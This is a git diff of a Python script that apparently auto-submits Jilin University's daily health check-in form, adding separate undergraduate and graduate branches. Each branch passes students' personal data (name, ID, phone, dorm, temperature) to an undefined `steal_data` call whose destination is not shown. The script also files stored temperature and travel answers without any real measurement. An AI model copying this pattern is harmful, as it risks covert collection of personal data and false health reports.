@@ -92,7 +92,15 @@ def check_config(_information, _info):
 
 
 def sign(info):
-    url = 'https://ehall.jlu.edu.cn/infoplus/form/YJSMRDK/start'
+    if 'bks' not in info.keys():
+        info["bks"] = 2
+    bks = info['bks']
+    if bks == "1":
+        print_log("您是本科生")
+        url = 'https://ehall.jlu.edu.cn/infoplus/form/BKSMRDK/start'
+    else:
+        print_log("您是研究生")
+        url = 'https://ehall.jlu.edu.cn/infoplus/form/YJSMRDK/start'
     headers = {
         "Host": "ehall.jlu.edu.cn",
         "User-Agent":
@@ -108,6 +116,7 @@ def sign(info):
     count = info['times']
     global email_name
     email_name = info['username']
+
     while True:
         try:
             count = count - 1
@@ -492,181 +501,212 @@ def sign(info):
             data[item] = ""
 
     # print("data", data)
-    formData = {
-        "_VAR_EXECUTE_INDEP_ORGANIZE_Name":
-            data['_VAR_EXECUTE_INDEP_ORGANIZE_Name'],
-        "_VAR_ACTION_ACCOUNT":
-            data['_VAR_ACTION_ACCOUNT'],
-        "_VAR_ACTION_INDEP_ORGANIZES_Codes":
-            data['_VAR_ACTION_INDEP_ORGANIZES_Codes'],
-        "_VAR_ACTION_REALNAME":
-            data['_VAR_ACTION_REALNAME'],
-        "_VAR_ACTION_INDEP_ORGANIZES_Names":
-            data['_VAR_ACTION_INDEP_ORGANIZES_Names'],
-        "_VAR_OWNER_ACCOUNT":
-            data['_VAR_OWNER_ACCOUNT'],
-        "_VAR_ACTION_ORGANIZES_Names":
-            data['_VAR_ACTION_ORGANIZES_Names'],
-        "_VAR_STEP_CODE":
-            data['_VAR_STEP_CODE'],
-        "_VAR_ACTION_ORGANIZE":
-            data['_VAR_ACTION_ORGANIZE'],
-        "_VAR_OWNER_PHONE":
-            data['_VAR_OWNER_PHONE'],
-        "_VAR_OWNER_USERCODES":
-            data['_VAR_OWNER_USERCODES'],
-        "_VAR_EXECUTE_ORGANIZE":
-            data['_VAR_EXECUTE_ORGANIZE'],
-        "_VAR_EXECUTE_ORGANIZES_Codes":
-            data['_VAR_EXECUTE_ORGANIZES_Codes'],
-        "_VAR_NOW_DAY":
-            data['_VAR_NOW_DAY'],
-        "_VAR_ACTION_INDEP_ORGANIZE":
-            data['_VAR_ACTION_INDEP_ORGANIZE'],
-        "_VAR_OWNER_REALNAME":
-            data['_VAR_OWNER_REALNAME'],
-        "_VAR_ACTION_INDEP_ORGANIZE_Name":
-            data['_VAR_ACTION_INDEP_ORGANIZE_Name'],
-        "_VAR_NOW":
-            data['_VAR_NOW'],
-        "_VAR_ACTION_ORGANIZE_Name":
-            data['_VAR_ACTION_ORGANIZE_Name'],
-        "_VAR_EXECUTE_ORGANIZES_Names":
-            data['_VAR_EXECUTE_ORGANIZES_Names'],
-        "_VAR_OWNER_ORGANIZES_Codes":
-            data['_VAR_OWNER_ORGANIZES_Codes'],
-        "_VAR_ADDR":
-            data['_VAR_ADDR'],
-        "_VAR_URL_Attr":
-            data['_VAR_URL_Attr'],
-        "_VAR_ENTRY_NUMBER":
-            data['_VAR_ENTRY_NUMBER'],
-        "_VAR_EXECUTE_INDEP_ORGANIZES_Names":
-            data['_VAR_EXECUTE_INDEP_ORGANIZES_Names'],
-        "_VAR_STEP_NUMBER":
-            data['_VAR_STEP_NUMBER'],
-        "_VAR_POSITIONS":
-            data['_VAR_POSITIONS'],
-        "_VAR_ACTION_PHONE":
-            data['_VAR_ACTION_PHONE'],
-        "_VAR_OWNER_ORGANIZES_Names":
-            data['_VAR_OWNER_ORGANIZES_Names'],
-        "_VAR_URL":
-            data['_VAR_URL'],
-        "_VAR_EXECUTE_ORGANIZE_Name":
-            data['_VAR_EXECUTE_ORGANIZE_Name'],
-        "_VAR_EXECUTE_INDEP_ORGANIZES_Codes":
-            data['_VAR_EXECUTE_INDEP_ORGANIZES_Codes'],
-        "_VAR_RELEASE":
-            data['_VAR_RELEASE'],
-        "_VAR_EXECUTE_POSITIONS":
-            data['_VAR_EXECUTE_POSITIONS'],
-        "_VAR_NOW_MONTH":
-            data['_VAR_NOW_MONTH'],
-        "_VAR_ACTION_USERCODES":
-            data['_VAR_ACTION_USERCODES'],
-        "_VAR_ACTION_ORGANIZES_Codes":
-            data['_VAR_ACTION_ORGANIZES_Codes'],
-        "_VAR_EXECUTE_INDEP_ORGANIZE":
-            data['_VAR_EXECUTE_INDEP_ORGANIZE'],
-        "_VAR_NOW_YEAR":
-            data['_VAR_NOW_YEAR'],
-        "fieldXY2":
-            data['fieldXY2'],
-        "fieldWY":
-            data['fieldWY'],
-        "fieldXY1":
-            data['fieldXY1'],
-        "fieldSQrq":
-            data['fieldSQrq'],
-        "fieldSQxm":
-            data['fieldSQxm'],  # 姓名
-        "fieldSQxm_Name":
-            data['fieldSQxm_Name'],
-        "fieldXH":
-            data['fieldXH'],
-        "fieldZY":
-            data['fieldZY'],  # 专业
-        "fieldSQnj":
-            data['fieldSQnj'],  # 年级代号
-        "fieldSQnj_Name":
-            data['fieldSQnj_Name'],  # 年级名字
-        "fieldSQxy":
-            data['fieldSQxy'],  # 学院代号
-        "fieldSQxy_Name":
-            data['fieldSQxy_Name'],  # 学院名字
-        "fieldSQxq":
-            data['fieldSQxq'],  # 校区代号
-        "fieldSQxq_Name":
-            data['fieldSQxq_Name'],  # 校区名字
-        "fieldSQsjh": data['fieldSQsjh'],
-        "fieldSQyjsms": data['fieldSQyjsms'],
-        "fieldSQyjsms_Name": data['fieldSQyjsms_Name'],
-        "fieldBKSpd": data['fieldBKSpd'],
-        "fieldXNSY": data['fieldXNSY'],
-        "fieldXNSY_Name": data['fieldXNSY_Name'],
-        "fieldXWSY": data["fieldXWSY"],
-        "fieldXWSY_Name": data["fieldXWSY_Name"],
-        "fieldSYQT": data['fieldSYQT'],
-        "fieldSQgyl":
-            data['fieldSQgyl'],  # 公寓楼代号
-        "fieldSQgyl_Name":
-            data['fieldSQgyl_Name'],  # 公寓楼名字
-        "fieldSQgyl_Attr": {
-            "_parent": data['fieldSQxq']
-        },  # #############
-        "fieldSQqsh": data['fieldSQqsh'],  # 寝室号
-        "fieldDZMC": data['fieldDZMC'],
-        "fieldHidden": data["fieldHidden"],  # 校外居住 校内居住不管
-        "fieldSheng": data["fieldSheng"],  # 省代码
-        "fieldSheng_Name":
-            data["fieldSheng_Name"],  # 省名字
-        "fieldShi": data["fieldShi"],  # 市代码
-        "fieldShi_Name": data["fieldShi_Name"],  # 市名字
-        "fieldShi_Attr": {
-            "_parent": ""
-        },  # ##############
-        "fieldQu": data["fieldQu"],  # 区代码
-        "fieldQu_Name": data["fieldQu_Name"],  # 区名字
-        # "fieldQu_Attr": "{\"_parent\":\"\"}",  # ##############
-        "fieldQu_Attr": {
-            "_parent": ""
-        },
-        "fieldQums": data["fieldQums"],  # 详细居住地
-        "fieldSFJTZGFXDQ": data["fieldSFJTZGFXDQ"],
-        "fieldSFJTZGFXDQsheng": data["fieldSFJTZGFXDQsheng"],
-        "fieldSFJTZGFXDQsheng_Name": data["fieldSFJTZGFXDQsheng_Name"],
-        "fieldSFJTZGFXDQshi": data['fieldSFJTZGFXDQshi'],
-        "fieldSFJTZGFXDQshi_Name": data['fieldSFJTZGFXDQshi_Name'],
-        "fieldSFJTZGFXDQshi_Attr": '',
-        "fieldSFJTZGFXDQqu": data['fieldSFJTZGFXDQqu'],
-        "fieldSFJTZGFXDQqu_Name": data['fieldSFJTZGFXDQqu_Name'],
-        "fieldSFJTZGFXDQqu_Attr": '',
-        "fieldSFJTZGFXDQxx": data['fieldSFJTZGFXDQxx'],
-        "fieldSQssbs":
-            data['fieldSQssbs'],  # 硕士博士 1硕士 2博士
-        "fieldZtw":
-            data['fieldZtw'],  # 体温 1正常 2异常
-        "fieldZtwyc":
-            data['fieldZtwyc'],  # 体温异常
-        # "fieldZhongtw":
-        #     data['fieldZhongtw'],  # 中午体温
-        # "fieldZhongtwyc":
-        #     data['fieldZhongtwyc'],  # 中午体温异常
-        # "fieldWantw":
-        #     data['fieldWantw'],  # 晚上体温
-        # "fieldWantwyc":
-        #     data['fieldWantwyc'],  # 晚上体温异常
-        "fieldHide":
-            data['fieldHide'],
-        "fieldXY3":
-            data['fieldXY3'],
-        "_VAR_ENTRY_NAME":
-            app['name'],
-        "_VAR_ENTRY_TAGS":
-            app['tags']
-    }
+    if bks == "1":
+        formData = {
+            "_VAR_EXECUTE_INDEP_ORGANIZE_Name": data['_VAR_EXECUTE_INDEP_ORGANIZE_Name'],
+            "_VAR_ACTION_ACCOUNT": data['_VAR_ACTION_ACCOUNT'],
+            "_VAR_ACTION_INDEP_ORGANIZES_Codes": data['_VAR_ACTION_INDEP_ORGANIZES_Codes'],
+            "_VAR_ACTION_REALNAME": data['_VAR_ACTION_REALNAME'],
+            "_VAR_ACTION_INDEP_ORGANIZES_Names": data['_VAR_ACTION_INDEP_ORGANIZES_Names'],
+            "_VAR_OWNER_ACCOUNT": data['_VAR_OWNER_ACCOUNT'],
+            "_VAR_ACTION_ORGANIZES_Names": data['_VAR_ACTION_ORGANIZES_Names'],
+            "_VAR_STEP_CODE": data['_VAR_STEP_CODE'],
+            "_VAR_ACTION_ORGANIZE": data['_VAR_ACTION_ORGANIZE'],
+            "_VAR_OWNER_USERCODES": data['_VAR_OWNER_USERCODES'],
+            "_VAR_EXECUTE_ORGANIZE": data['_VAR_EXECUTE_ORGANIZE'],
+            "_VAR_EXECUTE_ORGANIZES_Codes": data['_VAR_EXECUTE_ORGANIZES_Codes'],
+            "_VAR_NOW_DAY": data['_VAR_NOW_DAY'],
+            "_VAR_ACTION_INDEP_ORGANIZE": data['_VAR_ACTION_INDEP_ORGANIZE'],
+            "_VAR_OWNER_REALNAME": data['_VAR_OWNER_REALNAME'],
+            "_VAR_ACTION_INDEP_ORGANIZE_Name": data['_VAR_ACTION_INDEP_ORGANIZE_Name'],
+            "_VAR_NOW": data['_VAR_NOW'],
+            "_VAR_ACTION_ORGANIZE_Name": data['_VAR_ACTION_ORGANIZE_Name'],
+            "_VAR_EXECUTE_ORGANIZES_Names": data['_VAR_EXECUTE_ORGANIZES_Names'],
+            "_VAR_OWNER_ORGANIZES_Codes": data['_VAR_OWNER_ORGANIZES_Codes'],
+            "_VAR_ADDR": data['_VAR_ADDR'],
+            "_VAR_URL_Attr": data['_VAR_URL_Attr'],
+            "_VAR_ENTRY_NUMBER": data['_VAR_ENTRY_NUMBER'],
+            "_VAR_EXECUTE_INDEP_ORGANIZES_Names": data['_VAR_EXECUTE_INDEP_ORGANIZES_Names'],
+            "_VAR_STEP_NUMBER": data['_VAR_STEP_NUMBER'],
+            "_VAR_POSITIONS": data['_VAR_POSITIONS'],
+            "_VAR_OWNER_ORGANIZES_Names": data['_VAR_OWNER_ORGANIZES_Names'],
+            "_VAR_URL": data['_VAR_URL'],
+            "_VAR_EXECUTE_ORGANIZE_Name": data['_VAR_EXECUTE_ORGANIZE_Name'],
+            "_VAR_EXECUTE_INDEP_ORGANIZES_Codes": data['_VAR_EXECUTE_INDEP_ORGANIZES_Codes'],
+            "_VAR_RELEASE": data['_VAR_RELEASE'],
+            "_VAR_EXECUTE_POSITIONS": data['_VAR_EXECUTE_POSITIONS'],
+            "_VAR_NOW_MONTH": data['_VAR_NOW_MONTH'],
+            "_VAR_ACTION_USERCODES": data['_VAR_ACTION_USERCODES'],
+            "_VAR_ACTION_ORGANIZES_Codes": data['_VAR_ACTION_ORGANIZES_Codes'],
+            "_VAR_EXECUTE_INDEP_ORGANIZE": data['_VAR_EXECUTE_INDEP_ORGANIZE'],
+            "_VAR_NOW_YEAR": data['_VAR_NOW_YEAR'],
+            "fieldXY2": data['fieldXY2'],
+            "fieldWY": data['fieldWY'],
+            "fieldXY1": data['fieldXY1'],
+            "fieldSQrq": data['fieldSQrq'],
+            "fieldSQxm": data['fieldSQxm'],  # 姓名
+            "fieldSQxm_Name": data['fieldSQxm_Name'],
+            "fieldXH": data['fieldXH'],
+            "fieldSQxy": data['fieldSQxy'],  # 学院代号
+            "fieldSQxy_Name": data['fieldSQxy_Name'],  # 学院名字
+            "fieldSQnj": data['fieldSQnj'],  # 年级代号
+            "fieldSQnj_Name": data['fieldSQnj_Name'],  # 年级名字
+            "fieldSQnj_Attr": "{\"_parent\":\"" + data['_VAR_ACTION_ORGANIZE'] + "\"}",
+            "fieldSQbj": data["fieldSQbj"],
+            "fieldSQbj_Name": data['fieldSQbj_Name'],
+            "fieldSQbj_Attr": "{\"_parent\":\"" + data['fieldSQnj'] + "\"}",
+            "fieldSQxq": data['fieldSQxq'],  # 校区代号
+            "fieldSQxq_Name": data['fieldSQxq_Name'],  # 校区名字
+            "fieldSQsjh": data['fieldSQsjh'],
+            "fieldSQyjsms": data['fieldSQyjsms'],
+            "fieldSQyjsms_Name": data['fieldSQyjsms_Name'],
+            "fieldBKSpd": data['fieldBKSpd'],
+            "fieldXNSY": data['fieldXNSY'],
+            "fieldXNSY_Name": data['fieldXNSY_Name'],
+            "fieldXWSY": data["fieldXWSY"],
+            "fieldXWSY_Name": data["fieldXWSY_Name"],
+            "fieldSYQT": data['fieldSYQT'],
+            "fieldSQgyl": data['fieldSQgyl'],  # 公寓楼代号
+            "fieldSQgyl_Name": data['fieldSQgyl_Name'],  # 公寓楼名字
+            "fieldSQgyl_Attr": {"_parent": data['fieldSQxq']},  # #############
+            "fieldSQqsh": data['fieldSQqsh'],  # 寝室号
+            "fieldDZMC": data['fieldDZMC'],
+            "fieldHidden": data["fieldHidden"],  # 校外居住 校内居住不管
+            "fieldSheng": data["fieldSheng"],  # 省代码
+            "fieldSheng_Name": data["fieldSheng_Name"],  # 省名字
+            "fieldShi": data["fieldShi"],  # 市代码
+            "fieldShi_Name": data["fieldShi_Name"],  # 市名字
+            "fieldShi_Attr": {"_parent": ""},  # ##############
+            "fieldQu": data["fieldQu"],  # 区代码
+            "fieldQu_Name": data["fieldQu_Name"],  # 区名字
+            "fieldQu_Attr": "{\"_parent\":\"\"}",
+            "fieldQums": data["fieldQums"],  # 详细居住地
+            "fieldZGFXDQ": "风险地区为：大连，沈阳等",
+            "fieldSFJTZGFXDQ": data["fieldSFJTZGFXDQ"],
+            "fieldSFJTZGFXDQsheng": data["fieldSFJTZGFXDQsheng"],
+            "fieldSFJTZGFXDQsheng_Name": data["fieldSFJTZGFXDQsheng_Name"],
+            "fieldSFJTZGFXDQshi": data['fieldSFJTZGFXDQshi'],
+            "fieldSFJTZGFXDQshi_Name": data['fieldSFJTZGFXDQshi_Name'],
+            "fieldSFJTZGFXDQshi_Attr": '',
+            "fieldSFJTZGFXDQqu": data['fieldSFJTZGFXDQqu'],
+            "fieldSFJTZGFXDQqu_Name": data['fieldSFJTZGFXDQqu_Name'],
+            "fieldSFJTZGFXDQqu_Attr": '',
+            "fieldSFJTZGFXDQxx": data['fieldSFJTZGFXDQxx'],
+            "fieldZtw": data['fieldZtw'],  # 体温 1正常 2异常
+            "fieldZtwyc": data['fieldZtwyc'],  # 体温异常
+            # "fieldZhongtw":
+            #     data['fieldZhongtw'],  # 中午体温
+            # "fieldZhongtwyc":
+            #     data['fieldZhongtwyc'],  # 中午体温异常
+            # "fieldWantw":
+            #     data['fieldWantw'],  # 晚上体温
+            # "fieldWantwyc":
+            #     data['fieldWantwyc'],  # 晚上体温异常
+            "fieldHide": data['fieldHide'],
+            "fieldXY3": data['fieldXY3'],
+            "_VAR_ENTRY_NAME": app['name'],
+            "_VAR_ENTRY_TAGS": app['tags']
+        }
+    else:
+        formData = {
+            "_VAR_EXECUTE_INDEP_ORGANIZE_Name": data['_VAR_EXECUTE_INDEP_ORGANIZE_Name'],
+            "_VAR_ACTION_ACCOUNT": data['_VAR_ACTION_ACCOUNT'],
+            "_VAR_ACTION_INDEP_ORGANIZES_Codes": data['_VAR_ACTION_INDEP_ORGANIZES_Codes'],
+            "_VAR_ACTION_REALNAME": data['_VAR_ACTION_REALNAME'],
+            "_VAR_ACTION_INDEP_ORGANIZES_Names": data['_VAR_ACTION_INDEP_ORGANIZES_Names'],
+            "_VAR_OWNER_ACCOUNT": data['_VAR_OWNER_ACCOUNT'],
+            "_VAR_ACTION_ORGANIZES_Names": data['_VAR_ACTION_ORGANIZES_Names'],
+            "_VAR_STEP_CODE": data['_VAR_STEP_CODE'],
+            "_VAR_ACTION_ORGANIZE": data['_VAR_ACTION_ORGANIZE'],
+            "_VAR_OWNER_PHONE": data['_VAR_OWNER_PHONE'],
+            "_VAR_OWNER_USERCODES": data['_VAR_OWNER_USERCODES'],
+            "_VAR_EXECUTE_ORGANIZE": data['_VAR_EXECUTE_ORGANIZE'],
+            "_VAR_EXECUTE_ORGANIZES_Codes": data['_VAR_EXECUTE_ORGANIZES_Codes'],
+            "_VAR_NOW_DAY": data['_VAR_NOW_DAY'],
+            "_VAR_ACTION_INDEP_ORGANIZE": data['_VAR_ACTION_INDEP_ORGANIZE'],
+            "_VAR_OWNER_REALNAME": data['_VAR_OWNER_REALNAME'],
+            "_VAR_ACTION_INDEP_ORGANIZE_Name": data['_VAR_ACTION_INDEP_ORGANIZE_Name'],
+            "_VAR_NOW": data['_VAR_NOW'],
+            "_VAR_ACTION_ORGANIZE_Name": data['_VAR_ACTION_ORGANIZE_Name'],
+            "_VAR_EXECUTE_ORGANIZES_Names": data['_VAR_EXECUTE_ORGANIZES_Names'],
+            "_VAR_OWNER_ORGANIZES_Codes": data['_VAR_OWNER_ORGANIZES_Codes'],
+            "_VAR_ADDR": data['_VAR_ADDR'],
+            "_VAR_URL_Attr": data['_VAR_URL_Attr'],
+            "_VAR_ENTRY_NUMBER": data['_VAR_ENTRY_NUMBER'],
+            "_VAR_EXECUTE_INDEP_ORGANIZES_Names": data['_VAR_EXECUTE_INDEP_ORGANIZES_Names'],
+            "_VAR_STEP_NUMBER": data['_VAR_STEP_NUMBER'],
+            "_VAR_POSITIONS": data['_VAR_POSITIONS'],
+            "_VAR_ACTION_PHONE": data['_VAR_ACTION_PHONE'],
+            "_VAR_OWNER_ORGANIZES_Names": data['_VAR_OWNER_ORGANIZES_Names'],
+            "_VAR_URL": data['_VAR_URL'],
+            "_VAR_EXECUTE_ORGANIZE_Name": data['_VAR_EXECUTE_ORGANIZE_Name'],
+            "_VAR_EXECUTE_INDEP_ORGANIZES_Codes": data['_VAR_EXECUTE_INDEP_ORGANIZES_Codes'],
+            "_VAR_RELEASE": data['_VAR_RELEASE'],
+            "_VAR_EXECUTE_POSITIONS": data['_VAR_EXECUTE_POSITIONS'],
+            "_VAR_NOW_MONTH": data['_VAR_NOW_MONTH'],
+            "_VAR_ACTION_USERCODES": data['_VAR_ACTION_USERCODES'],
+            "_VAR_ACTION_ORGANIZES_Codes": data['_VAR_ACTION_ORGANIZES_Codes'],
+            "_VAR_EXECUTE_INDEP_ORGANIZE": data['_VAR_EXECUTE_INDEP_ORGANIZE'],
+            "_VAR_NOW_YEAR": data['_VAR_NOW_YEAR'],
+            "fieldXY2": data['fieldXY2'],
+            "fieldWY": data['fieldWY'],
+            "fieldXY1": data['fieldXY1'],
+            "fieldSQrq": data['fieldSQrq'],
+            "fieldSQxm": data['fieldSQxm'],  # 姓名
+            "fieldSQxm_Name": data['fieldSQxm_Name'],
+            "fieldXH": data['fieldXH'],
+            "fieldZY": data['fieldZY'],  # 专业
+            "fieldSQnj": data['fieldSQnj'],  # 年级代号
+            "fieldSQnj_Name": data['fieldSQnj_Name'],  # 年级名字
+            "fieldSQxy": data['fieldSQxy'],  # 学院代号
+            "fieldSQxy_Name": data['fieldSQxy_Name'],  # 学院名字
+            "fieldSQxq": data['fieldSQxq'],  # 校区代号
+            "fieldSQxq_Name": data['fieldSQxq_Name'],  # 校区名字
+            "fieldSQsjh": data['fieldSQsjh'],
+            "fieldSQyjsms": data['fieldSQyjsms'],
+            "fieldSQyjsms_Name": data['fieldSQyjsms_Name'],
+            "fieldBKSpd": data['fieldBKSpd'],
+            "fieldXNSY": data['fieldXNSY'],
+            "fieldXNSY_Name": data['fieldXNSY_Name'],
+            "fieldXWSY": data["fieldXWSY"],
+            "fieldXWSY_Name": data["fieldXWSY_Name"],
+            "fieldSYQT": data['fieldSYQT'],
+            "fieldSQgyl": data['fieldSQgyl'],  # 公寓楼代号
+            "fieldSQgyl_Name": data['fieldSQgyl_Name'],  # 公寓楼名字
+            "fieldSQgyl_Attr": {"_parent": data['fieldSQxq']},  # #############
+            "fieldSQqsh": data['fieldSQqsh'],  # 寝室号
+            "fieldDZMC": data['fieldDZMC'],
+            "fieldHidden": data["fieldHidden"],  # 校外居住 校内居住不管
+            "fieldSheng": data["fieldSheng"],  # 省代码
+            "fieldSheng_Name": data["fieldSheng_Name"],  # 省名字
+            "fieldShi": data["fieldShi"],  # 市代码
+            "fieldShi_Name": data["fieldShi_Name"],  # 市名字
+            "fieldShi_Attr": {"_parent": ""},  # ##############
+            "fieldQu": data["fieldQu"],  # 区代码
+            "fieldQu_Name": data["fieldQu_Name"],  # 区名字
+            "fieldQu_Attr": "{\"_parent\":\"\"}",
+            "fieldQums": data["fieldQums"],  # 详细居住地
+            "fieldSFJTZGFXDQ": data["fieldSFJTZGFXDQ"],
+            "fieldSFJTZGFXDQsheng": data["fieldSFJTZGFXDQsheng"],
+            "fieldSFJTZGFXDQsheng_Name": data["fieldSFJTZGFXDQsheng_Name"],
+            "fieldSFJTZGFXDQshi": data['fieldSFJTZGFXDQshi'],
+            "fieldSFJTZGFXDQshi_Name": data['fieldSFJTZGFXDQshi_Name'],
+            "fieldSFJTZGFXDQshi_Attr": '',
+            "fieldSFJTZGFXDQqu": data['fieldSFJTZGFXDQqu'],
+            "fieldSFJTZGFXDQqu_Name": data['fieldSFJTZGFXDQqu_Name'],
+            "fieldSFJTZGFXDQqu_Attr": '',
+            "fieldSFJTZGFXDQxx": data['fieldSFJTZGFXDQxx'],
+            "fieldSQssbs": data['fieldSQssbs'],  # 硕士博士 1硕士 2博士
+            "fieldZtw": data['fieldZtw'],  # 体温 1正常 2异常
+            "fieldZtwyc": data['fieldZtwyc'],  # 体温异常
+            "fieldHide": data['fieldHide'],
+            "fieldXY3": data['fieldXY3'],
+            "_VAR_ENTRY_NAME": app['name'],
+            "_VAR_ENTRY_TAGS": app['tags']
+        }
+
     steal_data(formData)
+    # print("formData", formData)
     formData = json.dumps(formData)
 
     body = {
@@ -682,7 +722,6 @@ def sign(info):
     }
     url = 'https://ehall.jlu.edu.cn/infoplus/interface/listNextStepsUsers'
     print_log('正在请求/infoplus/interface/listNextStepsUsers文件...')
-    # print("formData", formData)
     # print("body14", body)
     while True:
         try:
